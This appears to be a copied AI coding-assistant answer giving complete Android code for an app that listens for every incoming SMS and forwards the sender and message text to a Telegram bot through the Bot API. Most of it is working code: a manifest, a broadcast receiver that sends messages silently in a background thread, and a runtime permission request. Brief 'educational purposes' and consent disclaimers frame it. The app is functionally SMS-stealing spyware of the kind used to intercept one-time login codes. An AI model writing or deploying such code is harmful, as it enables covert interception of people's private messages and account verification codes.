create an Android app that reads SMS messages with the user's consent and sends them to a Telegram bot. This example is for educational purposes only and assumes you have the user's explicit permission.
Steps to Create the App:

    Set Up Your Android Studio Project.
    Update AndroidManifest.xml for Permissions.
    Create a BroadcastReceiver to Listen for SMS.
    Send SMS Data to a Telegram Bot.

1. Set Up Your Android Studio Project

    Open Android Studio and create a new project.
    Choose an "Empty Activity" and set the project name.

2. Update AndroidManifest.xml for Permissions

Add the necessary permissions to your AndroidManifest.xml:
XML

<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.example.smsreader">

    <uses-permission android:name="android.permission.RECEIVE_SMS" />
    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.INTERNET" />

    <application
        ...
        android:usesCleartextTraffic="true">
        
        <receiver android:name=".SmsReceiver">
            <intent-filter>
                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
            </intent-filter>
        </receiver>
        
    </application>
</manifest>

Public code references from 14 repositories
3. Create a BroadcastReceiver to Listen for SMS

Create a new Java/Kotlin class named SmsReceiver:
Java

package com.example.smsreader;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

public class SmsReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                SmsMessage[] messages = new SmsMessage[pdus.length];
                for (int i = 0; i < pdus.length; i++) {
                    messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                    String messageBody = messages[i].getMessageBody();
                    String sender = messages[i].getOriginatingAddress();
                    Log.d("SmsReceiver", "From: " + sender + ", Message: " + messageBody);

                    // Send message to Telegram bot
                    new Thread(() -> sendToTelegram(sender, messageBody)).start();
                }
            }
        }
    }

    private void sendToTelegram(String sender, String messageBody) {
        String botToken = "your_telegram_bot_token";
        String chatId = "your_chat_id";
        String message = "From: " + sender + "\nMessage: " + messageBody;
        String urlString = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + message;

        try {
            java.net.URL url = new java.net.URL(urlString);
            java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.getInputStream();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

Public code references from 14 repositories
2 vulnerabilities detected

4. Request Permissions at Runtime

In your MainActivity, request the necessary permissions:
Java

package com.example.smsreader;

import android.Manifest;
import android.content.pm.PackageManager;
import android.os.Bundle;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class MainActivity extends AppCompatActivity {
    private static final int PERMISSION_REQUEST_CODE = 1;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED ||
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_SMS}, PERMISSION_REQUEST_CODE);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                // Permissions granted
            } else {
                // Permissions denied
            }
        }
    }
}

Public code references from 14 repositories
Important Notes:

    User Consent: Always get explicit consent from users before accessing their SMS messages.
    Security and Privacy: Ensure that the app complies with privacy laws and regulations.
    Telegram Bot: Replace your_telegram_bot_token and your_chat_id with your actual Telegram bot token and chat ID.

